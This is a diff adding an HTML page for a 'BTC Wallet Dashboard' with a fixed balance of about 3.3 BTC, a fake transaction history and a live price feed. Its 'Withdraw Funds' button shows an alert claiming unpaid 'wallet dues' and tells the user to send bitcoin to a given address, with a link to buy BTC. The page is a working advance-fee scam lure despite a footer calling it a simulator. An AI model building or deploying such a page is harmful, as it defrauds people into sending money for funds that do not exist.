@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BTC Wallet Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f4f4f4;
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        nav {
+            background-color: #1e1e1e;
+            color: #fff;
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+            nav h1 {
+                font-size: 20px;
+            }
+
+        .btc-price {
+            font-size: 16px;
+            color: #00ff95;
+        }
+
+        .container {
+            flex: 1;
+            padding: 40px 20px;
+            max-width: 900px;
+            margin: auto;
+        }
+
+        .dashboard-box {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+            .dashboard-box h2 {
+                margin-bottom: 20px;
+                font-size: 22px;
+            }
+
+        .btn {
+            margin: 10px;
+            padding: 12px 25px;
+            font-size: 16px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            background-color: #1a73e8;
+            color: white;
+        }
+
+            .btn:disabled {
+                background-color: #ccc;
+                cursor: not-allowed;
+            }
+
+        .btc-address {
+            margin-top: 30px;
+            font-size: 14px;
+            word-break: break-all;
+            background: #f1f1f1;
+            padding: 10px;
+            border-radius: 5px;
+        }
+
+        footer {
+            background-color: #1e1e1e;
+            color: #ccc;
+            text-align: center;
+            padding: 30px 0;
+            font-size: 14px;
+        }
+
+            footer a {
+                color: #00bcd4;
+                text-decoration: none;
+                margin: 0 8px;
+            }
+    </style>
+</head>
+<body>
+
+    <nav>
+        <h1>BTC Wallet Dashboard</h1>
+        <div class="btc-price" id="btcPrice">Fetching BTC price...</div>
+    </nav>
+
+    <div class="container">
+        <div class="dashboard-box">
+            <h2>Welcome to Your Wallet</h2>
+            <p><strong>Wallet Balance:</strong> 3.3115321 BTC</p>
+
+            <button class="btn" onclick="alert('Verification not yet available.')">Verify Account</button>
+            <button class="btn" onclick="showPaymentPopup()">Withdraw Funds</button>
+            <button class="btn" disabled>Deposit Funds (Unavailable)</button>
+
+            <div class="btc-address">
+                <strong>Wallet Address:</strong><br>
+                bc1eqyuikw0damggha5t673e45ta63rhh6kxqp5l5t563
+                <div style="margin-top: 40px; text-align: left;">
+                    <h3>Transaction History</h3>
+                    <table style="width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 14px;">
+                        <thead>
+                            <tr style="background: #eee;">
+                                <th style="padding: 10px; text-align: left;">Date</th>
+                                <th style="padding: 10px; text-align: left;">TXID</th>
+                                <th style="padding: 10px; text-align: left;">Amount (BTC)</th>
+                                <th style="padding: 10px; text-align: left;">Status</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td style="padding: 10px;">2023-02-02</td>
+                                <td style="padding: 10px;">b6f699a2...e5a</td>
+                                <td style="padding: 10px;">+0.58943870</td>
+                                <td style="padding: 10px;">Confirmed</td>
+                                <td style="padding: 10px;">
+                                    <a href="tx.html?txid=b0p699a66t5" style="color: #1a73e8; text-decoration: none;">b0p699a2...e5a</a>
+                                </td>
+
+                            </tr>
+                            <tr>
+                                <td style="padding: 10px;">2023-01-02</td>
+                                <td style="padding: 10px;">ad2b91e0...c7d</td>
+                                <td style="padding: 10px;">-2.54729340</td>
+                                <td style="padding: 10px;">Confirmed</td>
+                                <td style="padding: 10px;">
+                                    <a href="tx.html?txid=b7d699a256t" style="color: #1a73e8; text-decoration: none;">b7d699a2...e5a</a>
+                                </td>
+
+                            </tr>
+                            <tr>
+                                <td style="padding: 10px;">2023-01-02</td>
+                                <td style="padding: 10px;">c6a9384e...a12</td>
+                                <td style="padding: 10px;">+0.17480000</td>
+                                <td style="padding: 10px;">Pending</td>
+                                <td style="padding: 10px;">
+                                    <a href="tx.html?txid=b8u699a2e5a" style="color: #1a73e8; text-decoration: none;">b8u699a2...e5a</a>
+                                </td>
+
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p><strong>Contact Us:</strong> support@btcsimwallet.com</p>
+        <p><a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></p>
+        <p>&copy; 2025 BTC Wallet Simulator. All rights reserved.</p>
+    </footer>
+
+    <script>
+        async function fetchBTCPrice() {
+            try {
+                const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
+                const data = await res.json();
+                document.getElementById('btcPrice').textContent = '1 BTC = $' + data.bitcoin.usd.toLocaleString();
+            } catch (err) {
+                document.getElementById('btcPrice').textContent = 'Price unavailable';
+            }
+        }
+
+        fetchBTCPrice();
+        setInterval(fetchBTCPrice, 30000); // refresh every 30s
+
+        function showPaymentPopup() {
+            alert("Error: Wallet dues unpaid for 2 years.\n\nTo unlock withdrawals, send dues to:\n\nbtc address: bc1qnkw0damggha5xp98mh9ra63rtf4kxqp5l52qs8\n\nNeed BTC? Visit: https://www.coinbase.com/");
+        }
+    </script>
+
+</body>
+</html>
+
+
